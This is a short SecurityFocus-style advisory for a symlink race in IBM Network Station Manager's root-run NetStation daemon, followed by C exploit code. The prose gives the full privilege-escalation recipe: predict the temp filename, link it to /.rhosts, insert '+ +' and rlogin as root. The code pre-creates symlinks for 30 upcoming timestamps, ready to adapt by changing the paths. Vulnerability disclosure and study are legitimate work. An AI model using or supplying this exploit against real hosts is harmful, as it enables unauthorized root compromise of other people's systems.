source: http://www.securityfocus.com/bid/900/info

IBM's Network Station Manager is a client/server application which facilitates management for IBM Network Stations. It is possible to locally gain root priviliges on hosts running the NetStation daemon. NetStation (which runs as root) creates temporary files in /tmp with predictable filenames based on a known partial filename and the current system time, creating a race condition which can lead to root compromise if the race is won. A symlink would have to be created with a correct predicted filename that points to (for example) /.rhosts, causing NetStation to write to it. The attacker would then add "+ +" to the file, chown root it and rlogin (or rsh in) as root.

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/time.h>

void main() {

/* Change these paths */
char dest[20] = "/.rhosts";
char source[50] = "/usr/netstation/nsm/users/xnec/xnec.nsu";
char sourcesym[50] = "/usr/netstation/nsm/users/xnec/xnec.nsu";
long sec;
int i;
sec = time(0);
for (i = 0; i < 30; i++) {
sprintf(sourcesym, "%s%d", source, (sec + i));
symlink(dest,sourcesym);
}

}